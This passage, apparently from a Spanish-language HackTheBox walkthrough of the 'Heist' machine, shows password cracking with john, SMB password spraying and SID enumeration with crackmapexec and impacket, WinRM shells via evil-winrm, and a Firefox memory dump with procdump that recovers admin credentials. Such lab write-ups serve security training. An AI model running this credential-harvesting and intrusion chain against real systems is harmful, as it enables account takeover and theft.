  <li>Podemos usar <code class="language-plaintext highlighter-rouge">john</code> para crackearlo y añadirlo a nuestra lista para poder aplicar el <code class="language-plaintext highlighter-rouge">password spray</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 512/512 AVX512BW 16x3]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
stealth1agent    <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:32 DONE <span class="o">(</span>2024-04-13 15:00<span class="o">)</span> 0.03101g/s 108732p/s 108732c/s 108732C/s stealthy001..ste88dup
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Estas son las contraseñas que tenemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>creds.txt
Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d
<span class="nv">$uperP</span>@ssword
stealth1agent
</code></pre></div></div>

<ul>
  <li>Vemos que tenemos credenciales validas para el usuario hazard.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 -u users.txt -p creds.txt --continue-on-success
SMB         10.129.116.26   445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
</code></pre></div></div>

<ul>
  <li>Tenemos estos recursos compartidos a nivel de red pero no son interesantes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 <span class="nt">-u</span> hazard <span class="nt">-p</span> stealth1agent <span class="nt">--shares</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\h</span>azard:stealth1agent
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] Enumerated shares
SMB         10.129.116.26   445    SUPPORTDESK      Share           Permissions     Remark
SMB         10.129.116.26   445    SUPPORTDESK      <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.116.26   445    SUPPORTDESK      ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.116.26   445    SUPPORTDESK      C<span class="nv">$ </span>                             Default share
SMB         10.129.116.26   445    SUPPORTDESK      IPC<span class="nv">$ </span>           READ            Remote IPC
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a enumerar por <code class="language-plaintext highlighter-rouge">RPC</code> ya que el puerto esta abierto.</p>
  </li>
  <li>
    <p>Pero no podemos.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s2">"hazard%stealth1agent"</span> 10.129.116.26
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
</code></pre></div></div>

<ul>
  <li>Algo que podemos hacer es conectarnos al panel de <code class="language-plaintext highlighter-rouge">login</code> ya que tenemos credenciales validas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/7.png" />
</p>

<ul>
  <li>Nos piden un email pero a saber cual si probamos con el de la maquina no nos deja.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/8.png" />
</p>

<h2 id="shell-as-chase">Shell as Chase</h2>

<ul>
  <li>Bueno algo que podemos hacer es usar <code class="language-plaintext highlighter-rouge">lookupsid.py</code> con esto podemos enumerar mas usuarios validos a nivel de sistema a partir de sus SID correspondientes pero necesitamos el dominio de la maquina a si que vamos a ver cual es con la herramienta de <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Y encontramos nuevos usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-lookupsid SUPPORTDESK/hazard:stealth1agent@10.129.116.26
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Brute forcing SIDs at 10.129.116.26
<span class="o">[</span><span class="k">*</span><span class="o">]</span> StringBinding ncacn_np:10.129.116.26[<span class="se">\p</span>ipe<span class="se">\l</span>sarpc]
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
501: SUPPORTDESK<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
503: SUPPORTDESK<span class="se">\D</span>efaultAccount <span class="o">(</span>SidTypeUser<span class="o">)</span>
504: SUPPORTDESK<span class="se">\W</span>DAGUtilityAccount <span class="o">(</span>SidTypeUser<span class="o">)</span>
513: SUPPORTDESK<span class="se">\N</span>one <span class="o">(</span>SidTypeGroup<span class="o">)</span>
1008: SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>SidTypeUser<span class="o">)</span>
1009: SUPPORTDESK<span class="se">\s</span>upport <span class="o">(</span>SidTypeUser<span class="o">)</span>
1012: SUPPORTDESK<span class="se">\C</span>hase <span class="o">(</span>SidTypeUser<span class="o">)</span>
1013: SUPPORTDESK<span class="se">\J</span>ason <span class="o">(</span>SidTypeUser<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver si uno de los usuarios que tenemos reutiliza alguna contraseña de las que tenemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 <span class="nt">-u</span> users.txt <span class="nt">-p</span> creds.txt <span class="nt">--continue-on-success</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\a</span>dmin:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\r</span>out3r:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\r</span>out3r:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\r</span>out3r:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\h</span>azard:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\h</span>azard:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\h</span>azard:stealth1agent
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\s</span>upport:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\s</span>upport:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\s</span>upport:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\C</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\C</span>hase:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\C</span>hase:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\J</span>ason:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\J</span>ason:<span class="nv">$uperP</span>@ssword STATUS_LOGON_FAILURE
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>-] SupportDesk<span class="se">\J</span>ason:stealth1agent STATUS_LOGON_FAILURE
</code></pre></div></div>

<ul>
  <li>El usuario Chase usa una contraseña que tenemos además el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Chase'</span> <span class="nt">-p</span> <span class="s1">'Q4)sJu\Y8qz*A3?d'</span>
SMB         10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span>
HTTP        10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.116.26:5985/wsman
WINRM       10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\C</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora podemos usar <code class="language-plaintext highlighter-rouge">evil-winrm</code> para conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Chase'</span> <span class="nt">-p</span> <span class="s1">'Q4)sJu\Y8qz*A3?d'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>supportdesk<span class="se">\c</span>hase
</code></pre></div></div>

<h1 id="user-flag">user flag</h1>

<ul>
  <li>Podemos leer la <code class="language-plaintext highlighter-rouge">user flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
03b82a9b1533ba49d298214751e7bd51
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>No tenemos ningún privilegio interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a ver los procesos que esta corriendo la maquina.</p>
  </li>
  <li>
    <p>Y vemos que esta corriendo el Firefox.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; ps

Handles  NPM<span class="o">(</span>K<span class="o">)</span>    PM<span class="o">(</span>K<span class="o">)</span>      WS<span class="o">(</span>K<span class="o">)</span>     CPU<span class="o">(</span>s<span class="o">)</span>     Id  SI ProcessName
<span class="nt">-------</span>  <span class="nt">------</span>    <span class="nt">-----</span>      <span class="nt">-----</span>     <span class="nt">------</span>     <span class="nt">--</span>  <span class="nt">--</span> <span class="nt">-----------</span>
    467      18     2288       5428               364   0 csrss
    287      13     1896       5020               476   1 csrss
    357      15     3484      14528              4936   1 ctfmon
    253      14     3956      13344              3868   0 dllhost
    166       9     1868       9768       0.02   6492   1 dllhost
    617      32    30384      57840               956   1 dwm
   1494      58    23864      78872              5236   1 explorer
   1087      69   129340     206756       4.94   6240   1 firefox
    347      20    10204      38616       0.08   6348   1 firefox
    401      35    34804      93476       0.73   6580   1 firefox
    378      28    22008      58588       0.38   6788   1 firefox
    355      25    16512      38936       0.08   7044   1 firefox
     49       6     1496       3892               768   0 fontdrvhost
     49       6     1776       4636               776   1 fontdrvhost
      0       0       56          8                 0   0 Idle
    973      23     5820      14900               624   0 lsass
    223      13     2948      10200              3928   0 msdtc
      0      12      324      15144                88   0 Registry
    273      14     2988      14820              4792   1 RuntimeBroker
    144       8     1644       7540              5716   1 RuntimeBroker
    304      16     5596      16948              5840   1 RuntimeBroker
    664      32    19612      61404              5640   1 SearchUI
    541      11     4732       9448               608   0 services
    691      29    14984      52012              5516   1 ShellExperienceHost
    443      17     4928      24064              4976   1 sihost
     53       3      516       1156               264   0 smss
    471      22     5928      16200              2500   0 spoolsv
    308      20     9708      14372               328   0 svchost
    199      12     1964       9520               368   0 svchost
    223      11     2844      10948               592   0 svchost
    149       9     1700      11584               704   0 svchost
     85       5      888       3792               724   0 svchost
    861      20     7020      22312               748   0 svchost
    310      16    13188      15460               792   0 svchost
    864      16     5180      11684               856   0 svchost
    255      10     1992       7676               904   0 svchost
    127       7     1544       6220               964   0 svchost
    379      13    10864      14812               976   0 svchost
    337      16     4732      13572              1004   0 svchost
    140       7     1304       5688              1132   0 svchost
    127      17     3640       7492              1164   0 svchost
    184       9     1776       7548              1232   0 svchost
    230      12     2668      11276              1240   0 svchost
    154       7     1208       5616              1252   0 svchost
    429       9     2752       8824              1260   0 svchost
    216       9     2128       7588              1324   0 svchost
    170      10     1756       7940              1364   0 svchost
    249      15     3236       8564              1404   0 svchost
    304      12     2084       9000              1412   0 svchost
    366      17     5104      14212              1428   0 svchost
    347      14     4588      11828              1532   0 svchost
    191      12     2076      11936              1548   0 svchost
    163      10     2504       7424              1680   0 svchost
    167       9     2160       7552              1752   0 svchost
    323      10     2604       8420              1780   0 svchost
    408      32     9056      17164              1804   0 svchost
    194      11     1972       8136              1884   0 svchost
    209      11     2780      11948              2032   0 svchost
    238      11     2504       9720              2040   0 svchost
    338      18    14776      31468              2168   0 svchost
    465      17     3376      11856              2192   0 svchost
    166      12     3904      10788              2588   0 svchost
    179      22     2496       9844              2596   0 svchost
    460      19    11424      26096              2604   0 svchost
    261      13     2568       7880              2624   0 svchost
    396      16    11124      20352              2648   0 svchost
    133       9     1616       6548              2684   0 svchost
    136       8     1508       6144              2720   0 svchost
    205      11     2260       8324              2728   0 svchost
    126       7     1224       5340              2740   0 svchost
    238      15     4792      11824              2836   0 svchost
    209      12     1872       7448              2844   0 svchost
    169      10     2132      13248              2852   0 svchost
    263      19     3588      12100              2864   0 svchost
    441      62    14756      23396              2900   0 svchost
    193      15     6000      10032              2956   0 svchost
    383      23     3308      12232              3184   0 svchost
    163       9     3016       7600              3948   0 svchost
    255      14     3188      13832              4468   0 svchost
    171       9     1476       7224              4492   0 svchost
    167       9     4212      11848              4596   0 svchost
    189      12     2696      13352              4860   0 svchost
    230      12     3036      13592              4992   1 svchost
    369      18     5652      27096              5016   1 svchost
    254      13     3296      12508              5448   0 svchost
    122       7     1232       5600              6188   0 svchost
    115       7     1236       5356              7032   0 svchost
   1892       0      192         88                 4   0 System
    210      20     3900      12436              5052   1 taskhostw
    167      11     2900      10840              2764   0 VGAuthService
    136       9     1808       7408              2532   1 vm3dservice
    142       8     1688       6888              2772   0 vm3dservice
    383      22     9320      21796              2796   0 vmtoolsd
    236      18     5048      15216              4828   1 vmtoolsd
    242      21     5912      14768              6708   0 w3wp
    171      11     1448       6852               468   0 wininit
    282      13     2812      12796               532   1 winlogon
    349      16     8968      18376              4024   0 WmiPrvSE
    824      27    53908      69688       0.63   6012   0 wsmprovhost
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos usar una herramienta <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">https://learn.microsoft.com/en-us/sysinternals/downloads/procdump</a> para realizar un volcado de un PID que le demos en este caso el de Firefox que analizaremos y ver las <code class="language-plaintext highlighter-rouge">strings</code> .</p>
  </li>
  <li>
    <p>Tenemos los <code class="language-plaintext highlighter-rouge">.exe</code> pero solo vamos a subir 1 ala maquina <strong>procdump64.exe</strong>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l Procdump.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 731622 bytes <span class="o">(</span>715 KiB<span class="o">)</span>

Listing archive: Procdump.zip

<span class="nt">--</span>
Path <span class="o">=</span> Procdump.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 731622

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2022-11-03 15:55:14 .....       791960       364222  procdump.exe
2022-11-03 15:55:14 .....       424856       196343  procdump64.exe
2022-11-03 15:55:14 .....       407952       167513  procdump64a.exe
2022-11-03 15:55:00 .....         7490         3120  Eula.txt
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2022-11-03 15:55:14            1632258       731198  4 files
</code></pre></div></div>

<ul>
  <li>Ahora ya los descomprimimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip Procdump.zip
Archive:  Procdump.zip
  inflating: procdump.exe
  inflating: procdump64.exe
  inflating: procdump64a.exe
  inflating: Eula.txt
</code></pre></div></div>

<ul>
  <li>Y lo subimos ala maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; upload procdump64.exe

Info: Uploading /home/miguel/Hackthebox/Heist/content/procdump64.exe to C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\p</span>rocdump64.exe

Data: 566472 bytes of 566472 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        4/14/2024   3:07 AM         424856 procdump64.exe
<span class="nt">-a----</span>        4/22/2019   9:08 AM            121 todo.txt
<span class="nt">-ar---</span>        4/14/2024   1:56 AM             34 user.txt
</code></pre></div></div>

<ul>
  <li>Necesitamos saber el PID para que funcione.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; ps | findstr firefox
   1083      69   135944     213292       5.03   6240   1 firefox
    347      20    10204      38616       0.08   6348   1 firefox
    401      34    32136      92488       0.78   6580   1 firefox
    378      28    22316      58980       0.38   6788   1 firefox
    355      25    16512      38936       0.08   7044   1 firefox
</code></pre></div></div>

<ul>
  <li>Para hacerlo hacemos lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; .<span class="se">\p</span>rocdump64.exe <span class="nt">-accepteula</span>
</code></pre></div></div>

<ul>
  <li>Ahora le pasamos los parámetros y el PID.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; .<span class="se">\p</span>rocdump64.exe <span class="nt">-accepteula</span> <span class="nt">-ma</span> 6240

ProcDump v11.0 - Sysinternals process dump utility
Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

<span class="o">[</span>03:54:16] Dump 1 initiated: C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\f</span>irefox.exe_240414_035416.dmp
<span class="o">[</span>03:54:16] Dump 1 writing: Estimated dump file size is 493 MB.
<span class="o">[</span>03:54:18] Dump 1 <span class="nb">complete</span>: 493 MB written <span class="k">in </span>2.5 seconds
<span class="o">[</span>03:54:19] Dump count reached.
</code></pre></div></div>

<ul>
  <li>Como el archivo pesa mucho lo que podemos hacer es que mientras se descarga podemos aplicar los <code class="language-plaintext highlighter-rouge">strings</code> y filtrar por <code class="language-plaintext highlighter-rouge">password</code> para ver si encontramos algo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; download C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\</span>
Info: Downloading C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop<span class="se">\f</span>irefox.exe_240414_035416.dmp to firefox.exe_240414_035416.dmp
</code></pre></div></div>

<ul>
  <li>Y vemos esto esas credenciales funcionan para logearnos en la pagina web como el Administrator.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content strings firefox.exe_240414_035416.dmp | <span class="nb">grep </span>password
passwordsCountHistogram
passwordmgr-crypto-login
passwordField
passwordElement
goog-passwordwhite-protox0E!
<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\M</span><span class="s2">ozilla Firefox</span><span class="se">\f</span><span class="s2">irefox.exe"</span> localhost/login.php?login_username<span class="o">=</span>admin@support.htb&amp;login_password<span class="o">=</span>4dD!5<span class="o">}</span>x/re8]FBuZ&amp;login<span class="o">=</span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/9.png" />
</p>

<ul>
  <li>Vemos también que el usuario esta dentro del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'4dD!5}x/re8]FBuZ'</span>
SMB         10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span>
HTTP        10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.116.26:5985/wsman
WINRM       10.129.116.26   5985   SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\A</span>dministrator:4dD!5<span class="o">}</span>x/re8]FBuZ <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="shell-as-administrator">Shell as administrator</h2>

<ul>
  <li>Ahora ya podemos ver la ultima flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'4dD!5}x/re8]FBuZ'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
5c7ac5f3da79f3018d63e5639785415f
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="dumping-sam-hashes">Dumping SAM hashes</h2>

<ul>
  <li>Aquí tenemos los hashes de algunos usuarios para hacer <code class="language-plaintext highlighter-rouge">pass the hash</code>.</li>
</ul>

